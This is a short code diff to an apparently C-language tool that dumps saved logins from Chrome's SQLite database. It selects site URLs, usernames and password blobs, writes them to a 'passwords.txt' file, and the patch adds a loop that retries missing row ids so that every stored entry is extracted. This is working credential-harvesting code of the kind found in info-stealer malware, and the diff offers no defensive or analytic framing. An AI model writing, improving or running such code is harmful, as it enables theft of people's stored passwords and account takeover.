@@ -18,6 +18,7 @@
 #define TEMP_DB_PATH          ".\\chromedb_tmp"
 #define USER_DATA_QUERY       "SELECT ORIGIN_URL,USERNAME_VALUE,PASSWORD_VALUE FROM LOGINS"
 #define SECRET_FILE           ".\\passwords.txt"
+#define ROW_ID_COUNT		100
 
 FILE *file_with_secrets;
 int row_id = 1;
@@ -88,9 +89,16 @@ static int process_row(void *passed_db, int argc, char **argv, char **col_name) 
 	int result;
 	int blob_size;
 	int i;
-
+again:
 	result = sqlite3_blob_open(db, "main", "logins", "password_value", row_id, 0, &blob);
 	if (result != SQLITE_OK) {
+		/* entries can have row_id not in order (1,2,3, ...)
+		   Yes, it is nasty trick but works
+		 */
+		if (row_id <= ROW_ID_COUNT) {
+			row_id++;
+			goto again;
+		}
 		fprintf(stderr, "sqlite3_blob_open() -> %s\n", sqlite3_errstr(result));
 		goto out_db;
 	}
